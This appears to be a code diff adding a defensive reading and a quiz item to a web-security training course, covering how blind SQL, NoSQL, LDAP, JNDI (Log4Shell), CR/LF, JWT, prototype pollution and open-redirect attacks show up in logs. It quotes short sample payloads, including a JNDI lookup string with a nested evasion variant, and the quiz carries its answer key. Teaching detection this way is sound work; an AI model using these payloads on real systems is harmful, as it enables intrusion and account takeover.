@@ -190,7 +190,7 @@ const webApplicationSecurityRoom: Room = {
   difficulty: "beginner",
   category: "Application Security",
   estimatedMinutes: 60,
-  xp: 335,
+  xp: 355,
   icon: "🌐",
   prerequisites: ["networking-protocols"],
   tasks: [
@@ -375,6 +375,43 @@ const webApplicationSecurityRoom: Room = {
       explanation:
         "Each tell follows directly from where the attack lands on the three-tier path. SQL injection ends at the database, so its evidence is split between the parameter that carried it and the response outcome that shows whether the query ran. Stored XSS is uniquely two-part (an innocuous-looking write, then a delayed read by somebody else) which is exactly why it is worse than reflected XSS and harder to spot. Path traversal resolves against the web server's own filesystem, so the response size gives it away. Command injection's real proof is never in the web log at all; it is the parent-child process relationship on the endpoint. Session flaws show up as one identity appearing in two places at once. And IDOR is the one with no signature whatsoever: every request is textbook-legal, which is precisely why a WAF cannot see it and why only behaviour betrays it.",
       xp: 40,
+    },
+
+    // ------------------------------------------------------------------
+    // Reading 3b: the rest of the injection family (web injection round, 2026-11-12)
+    // ------------------------------------------------------------------
+    {
+      type: "reading",
+      id: "webapp-r6",
+      heading: "The Rest of the Injection Family: Blind SQL, NoSQL, LDAP, JNDI, CR/LF, JWT and Prototype Pollution",
+      content:
+        `Reading 3 named the classic classes. The same rule (input treated as instruction) produces a longer family, and each member leaves its proof in a different log. Learn them by two questions: which part of the request carries the input, and which log confirms the input ran.\n\n` +
+        `**BLIND SQL INJECTION.** The query runs, but nothing comes back in the page. The attacker asks yes or no questions instead. In the TIME-BASED form the input adds a pause: SLEEP(5) on MySQL, WAITFOR DELAY '0:0:5' on SQL Server, pg_sleep(5) on PostgreSQL. The tell is time, not text. An endpoint that answers in 40 ms suddenly answers in 5.0 s, then in 40 ms again, then in 5.0 s, because each request is one bit of the answer. nginx prints it as $request_time, IIS as time-taken (milliseconds), Application Gateway as timeTaken. The database audit log confirms it: the statement carries the SLEEP or WAITFOR text and a query time of five seconds, run by the application's own database account from the web server's address. In the BOOLEAN form the response size alternates between two values (a page with results and a page without) on near-identical requests.\n\n` +
+        `**NOSQL OPERATOR INJECTION.** Document databases such as MongoDB take query operators as keys: $ne (not equal), $gt (greater than), $regex. A login that builds its query from the request lets password[$ne]=x in a form or query string, or {"password": {"$ne": ""}} in JSON, match any password. $regex lets an attacker guess a reset token one character at a time: ^a, ^b, ^c, then ^7a, ^7b. There is no SQL syntax to match, and neither the AWS core and SQL rule groups nor Azure's CRS 3.2 carry a NoSQL operator rule, so the WAF row is usually a custom rule the team added, or nothing. The proof is behaviour: a successful sign-in with no failed attempt before it, an operator name in a query string, a run of near-identical requests that differ by one character.\n\n` +
+        `**LDAP INJECTION.** A staff directory or a login backed by Active Directory builds a filter such as (&(uid=INPUT)(objectClass=person)). Input containing *, ), (, | or & changes the filter: *)(uid=* widens one search to the whole directory, admin)(&) turns a password check into a check that always passes. The access log shows those characters (often URL encoded as %2A, %28, %29) in a search or username parameter and a response size far above the page's normal one. On the domain controller, event 1644 (an expensive or inefficient search) appears only if field engineering diagnostics logging is turned on, so its absence proves nothing.\n\n` +
+        `**JNDI LOOKUP INJECTION (LOG4SHELL, CVE-2021-44228).** A Java application that logs a header with a vulnerable Log4j 2 version evaluates a lookup written inside it: \${jndi:ldap://host/a}. Any logged header works: User-Agent, X-Api-Version, a username. Attackers nest lookups to dodge simple matching: \${\${lower:j}ndi:...}. AWS WAF matches the plain form with Log4JRCE_HEADER (Known bad inputs) and Azure WAF CRS 3.2 with rule 944240. The proof is never in the web log. It is the server opening an OUTBOUND connection to LDAP (ports 389, 636 or a high port such as 1389) or resolving an attacker's domain, then fetching a class over HTTP, and then the java process starting a shell.\n\n` +
+        `**CR/LF AND HEADER INJECTION.** HTTP separates header lines with a carriage return and a line feed, %0d%0a when URL encoded. A parameter that the application copies into a response header (a redirect's Location, a Set-Cookie) lets the attacker end that header and write their own. A Set-Cookie written this way plants a session identifier the attacker already knows (session fixation, Reading 3). Azure WAF CRS 3.2 rule 921150 matches CR/LF in an argument; AWS managed rules have no CR/LF rule, so an AWS shop needs its own custom rule. The proof is one session identifier used first from the victim's address and then from the attacker's.\n\n` +
+        `**JWT TAMPERING.** A JSON Web Token is three base64url parts: header, payload, signature. The header names the signing algorithm. A server that trusts the header accepts {"alg":"none"} (base64url eyJhbGciOiJub25l) with no signature at all, or a kid (key id) value such as ../../dev/null that makes it read an empty file as the key, so the attacker signs with an empty secret. The payload then says whatever the attacker wants: "role":"admin". The tell is a customer's token reaching admin paths, a header prefix that never appears in the site's own tokens, and admin actions from an address that never signed in as an admin.\n\n` +
+        `**PROTOTYPE POLLUTION.** In JavaScript every object inherits from Object.prototype. A Node.js endpoint that deep-merges a JSON body into an object, without filtering keys, lets __proto__ or constructor.prototype write a property onto EVERY object in the process: isAdmin: true for every user, or an option that a library later passes to child_process. The request is ordinary JSON, so the WAF rarely matches it. The proof is what follows: a customer account suddenly allowed an admin export, or the node process starting sh, which a web worker has no reason to do.\n\n` +
+        `**OPEN REDIRECT.** A login page that sends the user on to ?next= or ?returnUrl= without checking the destination will forward a staff member from the company's own trusted address to an attacker's lookalike page. The link looks safe because it starts with the real domain. The proof is in three places: the redirect parameter naming an outside host, the staff member's proxy or firewall row to that host seconds later, and a sign-in with their account from a new address afterwards.\n\n` +
+        `**THE SAME LESSON EVERY TIME.** A WAF row tells you something was tried and whether a rule matched; it never tells you whether the input ran. Encoded, nested or split forms (caret-split w^h^o^a^m^i on cmd.exe, nested JNDI lookups, operators instead of SQL) pass signature rules. The confirmation sits one tier further in: response time and size, the database audit, the server's own processes and outbound connections, and the identity logs of the account that was abused.`,
+    },
+
+    {
+      type: "question",
+      id: "webapp-q4",
+      question:
+        "A product search on a MySQL-backed shop normally answers in about 40 ms. One client sends six near-identical searches; the nginx request times read 5.004, 0.041, 5.003, 5.002, 0.039, 5.004 seconds, all with status 200 and almost the same response size. Which log confirms what the client was doing?",
+      options: [
+        "The WAF log alone, because a managed SQL injection rule always matches a time-based payload",
+        "The MySQL audit log: statements from the shop's database account carrying SLEEP(5), each with a query time of about five seconds",
+        "The domain controller's security log, because a five second delay is an authentication timeout",
+        "None: the sizes are the same, so no data left the server and nothing happened",
+      ],
+      answer: 1,
+      explanation:
+        "This is time-based blind SQL injection: each request asks one yes or no question and the five second pause is the answer, so the response text and size stay the same. The WAF may or may not match an obfuscated form, which is why it cannot be the confirmation. A delay of exactly the injected length has nothing to do with authentication. Same sizes do not mean nothing happened: the data leaves one bit per request through timing. The database audit log shows the statement the input produced, with SLEEP in it and its query time.",
+      xp: 20,
     },
 
     // ------------------------------------------------------------------
